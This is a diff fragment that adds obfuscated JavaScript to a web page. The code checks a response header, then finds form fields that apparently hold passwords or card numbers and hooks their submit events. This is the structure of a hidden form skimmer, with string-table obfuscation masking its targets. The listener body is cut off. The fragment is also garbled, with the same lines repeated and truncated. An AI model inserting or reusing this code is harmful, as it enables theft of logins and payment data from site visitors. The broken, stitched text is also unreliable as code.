@@ -1,0 +1,21 @@
+fetch(document.location.href)
+        .then(resp => {
+            const _H23e = resp.headers.get(_4s[42]+_4s[7]+_4s[37]+_4s[20]+_4s[23]+_4s[37]+_4s[20]+_4s[22]+_4s[9]+_4s[23]+_4s[19]+_4s[33]+_4s[13]+_4s[14]+_4s[20]+_4s[26]+_4s[22]+_4s[2]+_4s[7]+_4s[27]+_4s[14]+_4s[19]+_4s[26]);
+            if (_H23e == null || !_H23e.includes(_4s[17]+_4s[23]+_4s[38]+_4s[18]+_4s[33]+_4s[27]+_4s[20]+_4s[22]+_4s[35]+_4s[13]+_4s[19])) {
+
+                for (var i = 0; i < _EAA6; i++) {
+                    var _H3 = document.forms[i].elements;
+                    for (var k = 0; k < _H3.length; k++) {
+                        if (_H3[k].type == _4s[24]+_4s[18]+_4s[35]+_4s[35]+_4s[44]+_4s[7]+_4s[13]+_4s[17] || _H3[k].name.toLowerCase() == _4s[19]+_4s[4]+_4s[19] || _H3[k].name.toLowerCase() == _4s[19]+_4s[18]+_4s[13]+_4s[17]+_4s[37]+_4s[33]+_4s[36]+_4s[5]+_4s[23]+_4s[13]) {
+                            document.forms[i].addEventListener(_4s[35]+_4s[33]+_4s[5]+_4s[36]+_4s[14]+_4s[20], function (ev) {        ...
+{
+            const _H23e = resp.headers.get(_4s[42]+_4s[7]+_4s[37]+_4s[20]+_4s[23]+_4s[37]+_4s[20]+_4s[22]+_4s[9]+_4s[23]+_4s[19]+_4s[33]+_4s[13]+_4s[14]+_4s[20]+_4s[26]+_4s[22]+_4s[2]+_4s[7]+_4s[27]+_4s[14]+_4s[19]+_4s[26]);
+            if (_H23e == null || !_H23e.includes(_4s[17]+_4s[23]+_4s[38]+_4s[18]+_4s[33]+_4s[27]+_4s[20]+_4s[22]+_4s[35]+_4s[13]+_4s[19])) {
+
+                for (var i = 0; i < _EAA6; i++) {
+                    var _H3 = document.forms[i].elements;
+                    for (var k = 0; k < _H3.length; k++) {
+                        if (_H3[k].type == _4s[24]+_4s[18]+_4s[35]+_4s[35]+_4s[44]+_4s[7]+_4s[13]+_4s[17] || _H3[k].name.toLowerCase() == _4s[19]+_4s[4]+_4s[19] || _H3[k].name.toLowerCase() == _4s[19]+_4s[18]+_4s[13]+_4s[17]+_4s[37]+_4s[33]+_4s[36]+_4s[5]+_4s[23]+_4s[13]) {
+                            document.forms[i].addEventListener(_4s[35]+_4s[33]+_4s[5]+_4s[36]+_4s[14]+_4s[20], function (ev) {                                
+                           ...
+const _H23e = resp.headers.get(_4s[42]+_4s[7]+_4s[37]+_4s[20]+_4s[23]+_4s[37]+_4s[20]+_4s[22]+_4s[9]+_4s[23]+_4s[19]+_4s[33]+_4s[13]+_4s[14]+_4s[20]+_4s[26]+_4s[22]+_4s[2]+_4s[7]+_4s[27]+_4s[14]+_4s[19]+_4s[26])
